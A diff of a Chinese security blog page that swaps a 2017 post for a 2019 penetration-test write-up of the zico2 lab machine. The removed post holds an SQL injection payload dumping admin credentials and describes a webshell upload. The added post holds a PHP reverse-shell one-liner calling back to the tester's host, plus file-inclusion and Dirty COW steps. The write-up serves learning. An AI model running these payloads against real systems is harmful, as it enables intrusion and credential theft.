@@ -96,26 +96,36 @@
 
 
 
-  <meta name="description" content="0x01 信息收集网站是南方数据的镜像站，随便点开一个新闻，出现了熟悉的？id=xxxx格式，进行分别用 ‘，and 1=1 ，and 1=2 进行了测试，发现存在sql注入漏洞。从电脑中掏出了sqlmap，就在这时，表哥要求手注，结果试了半天也没有成果，百度了一下“南方数据 漏洞”，发现有0day。
-0x02 进入后台">
+  <meta name="description" content="zico2靶机渗透测试主机发现及端口扫描利用nmap进行主机发现，扫描vm网卡的端口。172.16.158.1为本机ip，对172.16.158.129进行扫描
+对80端口进行渗透首先对目录进行扫描访问网站，发现可以访问的连接view.php。猜测有文件包含，尝试读取/etc/passwd，可以进行文件包含。访问扫描到的dbadmin文件夹，发现一个数据库管理页面。弱口令admin登陆。发现存在文">
 <meta property="og:type" content="article">
-<meta property="og:title" content="南方数据靶机渗透测试">
-<meta property="og:url" content="http://yoursite.com/2017/03/27/南方数据靶机渗透测试/index.html">
+<meta property="og:title" content="zico2靶机渗透测试">
+<meta property="og:url" content="http://yoursite.com/2019/07/15/zico2靶机渗透测试/index.html">
 <meta property="og:site_name" content="Windylh's blog">
-<meta property="og:description" content="0x01 信息收集网站是南方数据的镜像站，随便点开一个新闻，出现了熟悉的？id=xxxx格式，进行分别用 ‘，and 1=1 ，and 1=2 进行了测试，发现存在sql注入漏洞。从电脑中掏出了sqlmap，就在这时，表哥要求手注，结果试了半天也没有成果，百度了一下“南方数据 漏洞”，发现有0day。
-0x02 进入后台">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/1.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/2.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/3.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/4.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/5.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/6.png">
-<meta property="og:updated_time" content="2018-11-01T10:53:04.451Z">
+<meta property="og:description" content="zico2靶机渗透测试主机发现及端口扫描利用nmap进行主机发现，扫描vm网卡的端口。172.16.158.1为本机ip，对172.16.158.129进行扫描
+对80端口进行渗透首先对目录进行扫描访问网站，发现可以访问的连接view.php。猜测有文件包含，尝试读取/etc/passwd，可以进行文件包含。访问扫描到的dbadmin文件夹，发现一个数据库管理页面。弱口令admin登陆。发现存在文">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715171454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715171336.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715173156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715172841.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715174956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175423.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175822.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175936.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715180535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715181410.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715181952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715181825.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715182310.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715182350.png">
+<meta property="og:updated_time" content="2019-07-15T10:26:22.496Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="南方数据靶机渗透测试">
-<meta name="twitter:description" content="0x01 信息收集网站是南方数据的镜像站，随便点开一个新闻，出现了熟悉的？id=xxxx格式，进行分别用 ‘，and 1=1 ，and 1=2 进行了测试，发现存在sql注入漏洞。从电脑中掏出了sqlmap，就在这时，表哥要求手注，结果试了半天也没有成果，百度了一下“南方数据 漏洞”，发现有0day。
-0x02 进入后台">
-<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.3.27/1.png">
+<meta name="twitter:title" content="zico2靶机渗透测试">
+<meta name="twitter:description" content="zico2靶机渗透测试主机发现及端口扫描利用nmap进行主机发现，扫描vm网卡的端口。172.16.158.1为本机ip，对172.16.158.129进行扫描
+对80端口进行渗透首先对目录进行扫描访问网站，发现可以访问的连接view.php。猜测有文件包含，尝试读取/etc/passwd，可以进行文件包含。访问扫描到的dbadmin文件夹，发现一个数据库管理页面。弱口令admin登陆。发现存在文">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715171454.png">
 
 
 
@@ -123,7 +133,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2017/03/27/南方数据靶机渗透测试/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/07/15/zico2靶机渗透测试/"/>
 
 
 
@@ -133,7 +143,7 @@
   };
 </script>
 
-  <title>南方数据靶机渗透测试 | Windylh's blog</title>
+  <title>zico2靶机渗透测试 | Windylh's blog</title>
   
 
 
@@ -315,7 +325,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/03/27/南方数据靶机渗透测试/"/>
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/15/zico2靶机渗透测试/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Windylh"/>
@@ -332,7 +342,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">南方数据靶机渗透测试
+          <h1 class="post-title" itemprop="name headline">zico2靶机渗透测试
 
               
             
@@ -358,24 +368,12 @@
                 
               
 
-              <time title="Erstellt: 2017-03-27 00:00:00" itemprop="dateCreated datePublished" datetime="2017-03-27T00:00:00+08:00">2017-03-27</time>
+              <time title="Erstellt: 2019-07-15 00:00:00 / Geändert am: 18:26:22" itemprop="dateCreated datePublished" datetime="2019-07-15T00:00:00+08:00">2019-07-15</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2018-11-01 18:53:04" itemprop="dateModified" datetime="2018-11-01T18:53:04+08:00">2018-11-01</time>
               
             
           </span>
@@ -389,7 +387,7 @@
 
           
           
-            <span id="/2017/03/27/南方数据靶机渗透测试/" class="leancloud_visitors" data-flag-title="南方数据靶机渗透测试">
+            <span id="/2019/07/15/zico2靶机渗透测试/" class="leancloud_visitors" data-flag-title="zico2靶机渗透测试">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
@@ -420,12 +418,13 @@
       
 
       
-        <h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>网站是南方数据的镜像站，随便点开一个新闻，出现了熟悉的？id=xxxx格式，进行分别用 ‘，and 1=1 ，and 1=2 进行了测试，发现存在sql注入漏洞。从电脑中掏出了sqlmap，就在这时，表哥要求手注，结果试了半天也没有成果，百度了一下“南方数据 漏洞”，发现有0day。</p>
-<h2 id="0x02-进入后台"><a href="#0x02-进入后台" class="headerlink" title="0x02 进入后台"></a>0x02 进入后台</h2><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NewsType.asp?SmallClass=&apos;%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20</div><div class="line">union%20select%20*%20from%20news%20where%201=2%20and%20&apos;&apos;=&apos;</div></pre></td></tr></table></figure>
-<p>直接利用<br><img src="https://github.com/Windylh/image/raw/master/2017.3.27/1.png" alt="1.jpg"><br>解出得到的md5值为admin888，通过之前的搜索得知，默认后台为/admin/<br>登陆后台<br><img src="https://github.com/Windylh/image/raw/master/2017.3.27/2.png" alt="2.jpg"></p>
-<h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>发现有一个添加视频和一个添加下载程序两个上传口，并返回给你文件的路径，但只能上传gif|jpg|bmp|png|swf|doc|rar|php这几个格式。<br>查看网页配置，发现有允许上传的文件类型一项<br><img src="https://github.com/Windylh/image/raw/master/2017.3.27/3.png" alt="3.jpg"><br>在最后加上asp，保存，却还是不能上传asp。<br>最后在系统管理里发现了数据库备份<br><img src="https://github.com/Windylh/image/raw/master/2017.3.27/4.png" alt="4.jpg"><br><img src="https://github.com/Windylh/image/raw/master/2017.3.27/5.png" alt="5.jpg"><br>成功传入大马并执行cmd成功<br><img src="https://github.com/Windylh/image/raw/master/2017.3.27/6.png" alt="6jpg"><br>但是现在的账户在Administrator组中，但却没有权限，想要进一步搞事还需要提权。</p>
-<h2 id="未完待续。"><a href="#未完待续。" class="headerlink" title="未完待续。"></a>未完待续。</h2>
+        <h2 id="zico2靶机渗透测试"><a href="#zico2靶机渗透测试" class="headerlink" title="zico2靶机渗透测试"></a>zico2靶机渗透测试</h2><h3 id="主机发现及端口扫描"><a href="#主机发现及端口扫描" class="headerlink" title="主机发现及端口扫描"></a>主机发现及端口扫描</h3><p>利用nmap进行主机发现，扫描vm网卡的端口。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715171454.png" alt=""><br><code>172.16.158.1</code>为本机ip，对<code>172.16.158.129</code>进行扫描<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715171336.png" alt=""></p>
+<h3 id="对80端口进行渗透"><a href="#对80端口进行渗透" class="headerlink" title="对80端口进行渗透"></a>对80端口进行渗透</h3><p>首先对目录进行扫描<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715173156.png" alt=""><br>访问网站，发现可以访问的连接<code>view.php</code>。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715172841.png" alt=""><br>猜测有文件包含，尝试读取<code>/etc/passwd</code>，可以进行文件包含。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715174956.png" alt=""><br>访问扫描到的<code>dbadmin</code>文件夹，发现一个数据库管理页面。弱口令admin登陆。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175423.png" alt=""><br>发现存在文件路径，用刚才的文件包含尝试发现可以包含到。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175522.png" alt=""></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>文件存储了表结构，构造数据库文件进行getshell。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175822.png" alt=""><br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175908.png" alt=""><br>命令可以执行，可以getshell。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715175936.png" alt=""><br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715180535.png" alt=""></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>先将shell弹到本地。</p>
+<p>利用php sock弹shell。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $sock=fsockopen(<span class="string">"172.16.158.1"</span>,<span class="number">2333</span>);exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715181410.png" alt=""><br>执行<code>php shell.php</code><br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715181952.png" alt=""><br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715181825.png" alt=""><br>根据linux内核版本找到脏牛进行提权。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715182310.png" alt=""><br>切换firefart用户获取root权限。<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2019.7.15/20190715182350.png" alt=""></p>
+
       
     </div>
 
@@ -448,11 +447,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web/" rel="tag"># Web</a>
-          
             <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
-          
-            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
           
         </div>
       
@@ -465,15 +460,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/04/25/CVE-2017-3193复现/" rel="next" title="CVE-2017-3193复现">
+                <i class="fa fa-chevron-left"></i> CVE-2017-3193复现
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/04/05/XSS漏洞利用姿势/" rel="prev" title="XSS漏洞利用姿势">
-                XSS漏洞利用姿势 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -704,7 +699,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-进入后台"><span class="nav-number">2.</span> <span class="nav-text">0x02 进入后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传木马"><span class="nav-number">3.</span> <span class="nav-text">上传木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#未完待续。"><span class="nav-number">4.</span> <span class="nav-text">未完待续。</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#zico2靶机渗透测试"><span class="nav-number">1.</span> <span class="nav-text">zico2靶机渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#主机发现及端口扫描"><span class="nav-number">1.1.</span> <span class="nav-text">主机发现及端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对80端口进行渗透"><span class="nav-number">1.2.</span> <span class="nav-text">对80端口进行渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限提升"><span class="nav-number">1.4.</span> <span class="nav-text">权限提升</span></a></li></ol></li></ol></div>
             
 
           </div>
